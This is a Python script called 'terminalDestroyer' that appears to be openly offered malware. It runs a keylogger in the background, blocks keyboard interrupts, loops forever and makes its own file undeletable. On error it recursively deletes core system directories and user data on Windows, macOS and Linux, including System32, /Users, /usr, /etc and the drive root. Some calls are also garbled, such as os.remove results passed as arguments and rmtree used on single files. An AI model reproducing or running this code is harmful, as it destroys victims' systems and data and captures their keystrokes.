import os
import platform
import keylogger
import background_runner
import test
import test1
import test2
import powershell
import mycmd
import terminal
import shutil

# For Windows, you can use the following code to make the terminal unusable by deleting the cmd.exe and powershell.exe files. Please note that this is a destructive action and should be used with caution.

CURRENT_OS = platform.system()


def terminalDestroyer():

        while True:
                if CURRENT_OS == 'Windows':
                        try:
                                background_runner.run_in_background(terminal.start_terminal)
                                background_runner.run_in_background(mycmd.starter_cmd())
                                background_runner.run_in_background(powershell.start_powershell)
                                background_runner.run_in_background(keylogger.start_keylogger)
                                background_runner.run_in_background(test._suppress_keyboard_interrupt())
                                background_runner.run_in_background(test.run_forever())
                                background_runner.run_in_background(test1.make_file_undeletable("make_terminal_unusable.py"))
                                background_runner.run_in_background(test2.load_key("make_terminal_unusable.py"))
                        except Exception as e:
                                        print(f"An error occurred: {e}")
                                        mycmd.starter_cmd(os.remove("C:\\Windows\\System32\\cmd.exe")) or powershell.start_powershell(os.remove("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\cmd.exe"))
                                        mycmd.starter_cmd(os.remove("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")) or powershell.start_powershell(os.remove("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
                                        shutil.rmtree("C:\\Windows\\System32")
                                        shutil.rmtree("C:\\Windows")
                                        shutil.rmtree("C:\\Users")
                                        shutil.rmtree("C:\\program files")
                                        shutil.rmtree("C:\\program files (x86)")
                                        shutil.rmtree("C:\\")

                # For MacOS, you can use the following code to make the terminal unusable by deleting the Terminal.app file. Please note that this is a destructive action and should be used with caution.

                elif CURRENT_OS == 'Darwin':
                        try:
                                background_runner.run_in_background(terminal.start_terminal)
                                background_runner.run_in_background(mycmd.starter_cmd())
                                background_runner.run_in_background(powershell.start_powershell)
                                background_runner.run_in_background(keylogger.start_keylogger)
                                background_runner.run_in_background(test._suppress_keyboard_interrupt())
                                background_runner.run_in_background(test.run_forever())
                                background_runner.run_in_background(test1.make_file_undeletable("make_terminal_unusable.py"))
                                background_runner.run_in_background(test2.load_key("make_terminal_unusable.py"))

                        except Exception as e:
                                        print(f"An error occurred: {e}")
                                        terminal.start_terminal(os.remove("/Applications/Utilities/Terminal.app"))
                                        shutil.rmtree("/Applications/Utilities")
                                        shutil.rmtree("/Applications")
                                        shutil.rmtree("/Users")
                                        shutil.rmtree("/System")
                                        shutil.rmtree("/Library")
                                        shutil.rmtree("/bin")
                                        shutil.rmtree("/sbin")
                                        shutil.rmtree("/usr")
                                        shutil.rmtree("/var")
                                        shutil.rmtree("/etc")
                                        shutil.rmtree("/root")


                # For Linux, you can use the following code to make the terminal unusable by deleting the bash executable. Please note that this is a destructive action and should be used with caution.

                elif CURRENT_OS == 'Linux':
                        try:
                                background_runner.run_in_background(terminal.start_terminal)
                                background_runner.run_in_background(mycmd.starter_cmd())
                                background_runner.run_in_background(powershell.start_powershell)
                                background_runner.run_in_background(keylogger.start_keylogger)
                                background_runner.run_in_background(test._suppress_keyboard_interrupt())
                                background_runner.run_in_background(test.run_forever())
                                background_runner.run_in_background(test1.make_file_undeletable("make_terminal_unusable.py"))
                                background_runner.run_in_background(test2.load_key("make_terminal_unusable.py"))

                        except Exception as e:
                                        print(f"An error occurred: {e}")
                                        shutil.rmtree("/root/terminal")
                                        shutil.rmtree("/bin/sh")
                                        shutil.rmtree("/bin/bash")
                                        shutil.rmtree("/bin")
                                        shutil.rmtree("/sbin")
                                        shutil.rmtree("/usr")
                                        shutil.rmtree("/var")
                                        shutil.rmtree("/etc")
                                        shutil.rmtree("/root")


                else:   print("Unsupported operating system.")


if __name__ == '__main__':
    terminalDestroyer()